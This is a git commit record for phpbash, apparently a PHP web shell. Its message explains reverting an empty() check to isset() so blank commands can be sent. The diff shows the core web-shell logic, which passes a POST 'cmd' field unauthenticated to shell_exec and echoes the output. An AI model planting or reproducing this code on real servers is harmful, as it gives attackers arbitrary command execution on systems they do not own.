e68c651db7762837658a2994a055d92a4294045d
Arrexel <Arrexel@users.noreply.github.com>
2018-02-02 13:28:33 -0500

    Revert empty() check to isset() for cmd
    We still need to be able to pass an empty string to the terminal. It would be much more hack-n-slash to prevent sending a blank command, and I personally feel it is more like a real terminal when you are able to send a blank command. If empty() is used, the code would also need to be modified further to prevent it from returning the full console HTML, as it would fail the php check and never hit die() if a blank command is sent.

--- phpbash.php
+++ phpbash.php
@@ -1,6 +1,6 @@
 <?php
 /* phpbash by Alexander Reid (Arrexel) */
-if (!empty($_POST['cmd'])) {
+if (ISSET($_POST['cmd'])) {
     $output = preg_split('/[\n]/', shell_exec($_POST['cmd']." 2>&1"));
     foreach ($output as $line) {
         echo htmlentities($line, ENT_QUOTES | ENT_HTML5, 'UTF-8')."<br>";
